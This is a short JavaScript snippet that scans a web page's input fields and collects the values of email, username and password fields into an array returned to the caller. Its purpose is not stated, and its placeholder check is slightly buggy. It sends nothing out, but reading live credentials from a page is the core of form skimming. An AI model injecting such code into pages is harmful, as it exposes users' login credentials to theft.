var inpObj = document.getElementsByTagName("input");
var data=new Array;
for(var i in inpObj)
{
	if(inpObj[i].type == "email" || inpObj[i].name == "email" || inpObj[i].name == "username" || (inpObj[i].placeholder && inpObj[i].placeholder.match(/email/i)!=-1))
	{
		if(inpObj[i].value!=""){
			data.push(inpObj[i].id);
			data.push(inpObj[i].value); 
		}
	}
	else if(inpObj[i].type=="password")
	{ 
		alert("pass");
		if(inpObj[i].value!=""){
			data.push(inpObj[i].id);
			data.push(inpObj[i].value); 
		}
	}
}
data